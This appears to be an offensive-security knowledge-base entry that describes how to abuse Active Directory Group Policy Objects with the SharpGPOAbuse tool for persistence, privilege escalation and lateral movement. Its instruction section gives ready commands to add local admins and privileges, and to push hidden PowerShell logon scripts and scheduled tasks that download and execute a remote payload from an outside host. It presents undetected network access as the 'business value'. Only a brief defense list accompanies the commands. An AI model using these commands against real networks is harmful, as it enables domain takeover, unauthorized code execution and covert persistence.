---
id: 32b6f6f3-8473-4b1d-8af3-d7dfaa990947
name: Abusing Group Policy Objects with SharpGPOAbuse
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:03.648704+00:00'
updated_at: '2023-04-10T20:36:12.026433+00:00'
tags:
- '[[Abuse GPO with SharpGPOAbuse]]'
- '[[Active Directory Attacks]]'
- '[[Exploit Group Policy Objects GPO]]'
---

# Abusing Group Policy Objects with SharpGPOAbuse

## Summary

Abusing Group Policy Objects is a common technique used by attackers to gain persistence, escalate privileges, and move laterally within a network. SharpGPOAbuse is a tool that allows an attacker to modify or create Group Policy Objects to achieve their objectives. This tool can be used by an attac

## Description

# Description

Abusing Group Policy Objects is a common technique used by attackers to gain persistence, escalate privileges, and move laterally within a network. SharpGPOAbuse is a tool that allows an attacker to modify or create Group Policy Objects to achieve their objectives. This tool can be used by an attacker to execute arbitrary code, create new user accounts, add users to privileged groups, and more. To use SharpGPOAbuse, an attacker must have administrative access to a domain controller or have access to a domain administrator account.

From a technical perspective, SharpGPOAbuse works by creating a new Group Policy Object or modifying an existing one to include a script or command that will be executed by the Group Policy client on targeted computers. This allows the attacker to execute arbitrary code or commands with elevated privileges.

The business value of using SharpGPOAbuse is that it allows an attacker to gain persistent access to a network, escalate privileges, and move laterally within the network undetected.

 

## Requirements

1. Administrative access to a domain controller

1. Access to a domain administrator account

 

## Defense

1. Limit the use of domain administrator accounts to trusted individuals

1. Implement strong password policies and multi-factor authentication

1. Regularly review and audit Group Policy Objects for unauthorized modifications

 

## Objectives

1. Gain persistent access to a target network

1. Escalate privileges within the target network

1. Move laterally within the target network

 

# Instructions

1. To configure SharpGPOAbuse, follow the below steps:
1. Clone the SharpGPOAbuse repository using the command 'git clone https://github.com/FSecureLABS/SharpGPOAbuse'
2. Install the CommandLineParser package version 1.9.3.15 using the command '$ Install-Package CommandLineParser -Version 1.9.3.15'
3. Use ILMerge to create the SharpGPOAbuse.exe file using the command '$ ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll'
4. To add user rights, run the command '.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"'
5. To add a local admin, run the command '.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"'
6. To configure a user or computer logon script, run the command '.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"'
7. To configure a computer or user immediate task, run the command '.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"'

 



**Code**: [[# Build and configure SharpGPOAbuse
$ git clone ht]]



> This command is used to configure SharpGPOAbuse, a tool used for exploiting Group Policy Objects (GPOs) in Active Directory environments. The 'git clone' command is used to clone the SharpGPOAbuse repository, while the 'Install-Package' command is used to install the CommandLineParser package. The 'ILMerge' command is used to merge the SharpGPOAbuse.exe and CommandLine.dll files into a single executable. The remaining commands are used to add user rights, add a local admin, configure a user or computer logon script, and configure a computer or user immediate task. The 'TaskName' argument specifies the name of the task, while the 'Author' argument specifies the author of the task. The 'Command' argument specifies the command to be executed, while the 'Arguments' argument specifies the arguments to be passed to the command. The 'GPOName' argument specifies the name of the GPO to which the configuration should be applied.

## Tags

- [[Abuse GPO with SharpGPOAbuse]]
- [[Active Directory Attacks]]
- [[Exploit Group Policy Objects GPO]]


